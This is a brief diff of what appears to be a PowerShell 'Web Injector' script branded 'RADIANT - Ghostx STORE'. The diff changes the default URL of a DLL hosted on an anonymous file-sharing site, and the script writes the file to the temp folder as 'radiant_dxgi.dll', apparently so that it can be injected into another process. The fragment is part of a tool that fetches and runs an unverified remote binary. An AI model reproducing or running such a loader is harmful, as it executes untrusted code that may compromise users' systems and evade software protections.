@@ -30,7 +30,7 @@ if (-not ("Win32" -as [type])) {
 }
 
 # --- CONFIG ---
-$defaultUrl = "https://files.catbox.moe/1jcfgb.dll"
+$defaultUrl = "https://files.catbox.moe/nb3wab.dll"
 $tempDllPath = "$env:TEMP\radiant_dxgi.dll"
 
 Write-Host "`n    RADIANT - Ghostx STORE | Web Injector" -ForegroundColor Cyan
